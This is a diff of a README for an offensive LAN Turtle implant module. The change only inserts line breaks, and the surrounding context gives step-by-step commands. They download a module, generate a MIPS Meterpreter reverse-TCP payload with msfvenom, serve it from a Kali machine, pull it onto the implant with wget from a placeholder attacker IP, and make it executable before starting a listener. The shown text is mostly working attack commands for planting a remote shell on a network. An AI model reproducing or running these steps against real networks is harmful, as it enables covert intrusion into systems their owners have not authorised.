@@ -9,14 +9,17 @@
 **1 - On LAN Turtle: download module from github**<br />
 `wget https://raw.githubusercontent.com/ATTACKnDEFEND/LanTurtle/main/meterpreter-mipsbe-reverse-tcp -O
 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
+<br />
 `chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
 
 **3 - On Kali: generate Meterpreter payload with Msfvenom**<br />
 `msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > meterpreter-mipsbe-reverse-tcp`<br />
+<br />
 `sudo cp meterpreter-mipsbe-reverse-tcp /var/www/html/meterpreter-mipsbe-reverse-tcp`<br />
 
 **4 - On LAN Turtle: transfer Meterpreter payload**<br />
 `wget <KALI IP>/meterpreter-mipsbe-reverse-tcp -O /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
+<br />
 `chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
 
 **5 - On Kali: start Meterpreter listerner**<br />
